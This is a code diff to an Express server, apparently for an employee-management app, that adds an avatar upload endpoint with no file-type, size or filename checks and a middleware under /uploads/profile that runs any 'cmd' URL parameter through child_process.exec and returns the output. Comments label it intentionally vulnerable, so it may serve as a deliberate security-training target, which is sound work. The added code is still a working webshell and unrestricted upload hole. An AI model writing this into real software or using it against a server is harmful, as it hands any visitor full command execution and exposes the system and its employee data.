@@ -26,6 +26,51 @@ if (!fs.existsSync(uploadsDir)) {
 }
 app.use('/uploads', express.static(uploadsDir));
 
+// Set up static file serving
+app.use(express.static(path.join(__dirname, 'public')));
+
+// Add serving of uploaded files - THIS IS DANGEROUS - Allows execution of uploaded files
+// THIS IS INTENTIONALLY VULNERABLE - DO NOT USE IN PRODUCTION
+app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
+app.use('/uploads/profile', (req, res, next) => {
+  // EXTREMELY DANGEROUS: Execute JS files if requested directly
+  // This allows webshells to run when accessed
+  const filePath = path.join(__dirname, 'uploads', 'profile', req.path);
+  
+  if (fs.existsSync(filePath) && filePath.endsWith('.js')) {
+    console.log(`[VULNERABLE] Executing JS file: ${filePath}`);
+    try {
+      // Execute the JS file directly
+      // This is EXTREMELY DANGEROUS and should NEVER be done in production
+      const jsContent = fs.readFileSync(filePath, 'utf8');
+      
+      // Handle command parameter for webshell functionality
+      if (req.query.cmd) {
+        const { exec } = require('child_process');
+        // EXTREME VULNERABILITY: Direct command execution from URL parameter
+        exec(req.query.cmd, (error, stdout, stderr) => {
+          res.setHeader('Content-Type', 'text/html');
+          if (error) {
+            res.send(`<h1>Command Error</h1><pre>${error.message}</pre><pre>${stderr}</pre>`);
+            return;
+          }
+          res.send(`<h1>Command Output</h1><pre>${stdout}</pre>`);
+        });
+      } else {
+        // Otherwise just execute the JS code
+        res.setHeader('Content-Type', 'text/html');
+        res.send(`<h1>File Content</h1><pre>${jsContent}</pre><p>Add ?cmd=COMMAND to execute a command</p>`);
+      }
+    } catch (error) {
+      console.error(`Error executing JS file: ${error.message}`);
+      next();
+    }
+  } else {
+    // Serve non-JS files normally
+    next();
+  }
+}, express.static(path.join(__dirname, 'uploads', 'profile')));
+
 // Database configuration
 const dbConfig = {
   host: 'database-1.cluster-cnye4gmgu5x2.us-east-1.rds.amazonaws.com',
@@ -2365,5 +2410,89 @@ app.put('/api/performance/goals/:goalId', async (req, res) => {
       success: false,
       message: `Failed to update goal: ${error.message}`
     });
+  }
+});
+
+// VULNERABLE ENDPOINT - This endpoint allows uploading any file as a profile picture
+// with no validation of file type, size, or content.
+// This is intentionally vulnerable to allow uploading of webshells
+// DO NOT USE IN PRODUCTION
+app.post('/api/profile/upload-avatar', async (req, res) => {
+  try {
+    console.log('Received profile picture upload request');
+    
+    // Create uploads/profile directory if it doesn't exist
+    const profileDir = path.join(__dirname, 'uploads', 'profile');
+    if (!fs.existsSync(profileDir)) {
+      fs.mkdirSync(profileDir, { recursive: true });
+    }
+    
+    // Setup a vulnerable storage configuration with no validation
+    const vulnerableStorage = multer.diskStorage({
+      destination: function (req, file, cb) {
+        cb(null, profileDir);
+      },
+      filename: function (req, file, cb) {
+        // Use the original filename, which could be a .js file
+        // This allows uploading executable Node.js files
+        const fileName = file.originalname;
+        cb(null, fileName);
+      }
+    });
+    
+    // Create a vulnerable upload middleware with no limits or validation
+    const vulnerableUpload = multer({ 
+      storage: vulnerableStorage,
+      // Intentionally NO validation or limits
+      // No file size limit
+      // No file type checking
+      // No filename sanitization
+    });
+    
+    // Process the upload
+    vulnerableUpload.single('avatar')(req, res, async function(err) {
+      if (err) {
+        return res.status(500).json({ success: false, message: 'Upload failed', error: err.message });
+      }
+      
+      if (!req.file) {
+        return res.status(400).json({ success: false, message: 'No file uploaded' });
+      }
+      
+      try {
+        const { userId } = req.body;
+        const filePath = `/uploads/profile/${req.file.filename}`;
+        
+        // If userId is provided, update the user's avatar in the database
+        if (userId) {
+          const connection = await pool.getConnection();
+          try {
+            await connection.execute(
+              'UPDATE employees SET avatar = ? WHERE id = ?',
+              [filePath, userId]
+            );
+          } finally {
+            connection.release();
+          }
+        }
+        
+        // Return success with file information
+        res.json({
+          success: true,
+          message: 'Profile picture uploaded successfully',
+          file: {
+            filename: req.file.filename,
+            path: filePath,
+            size: req.file.size
+          }
+        });
+      } catch (error) {
+        console.error('Error saving profile picture:', error);
+        res.status(500).json({ success: false, message: 'Failed to save profile picture', error: error.message });
+      }
+    });
+  } catch (error) {
+    console.error('Error in profile picture upload:', error);
+    res.status(500).json({ success: false, message: 'Server error', error: error.message });
   }
 });
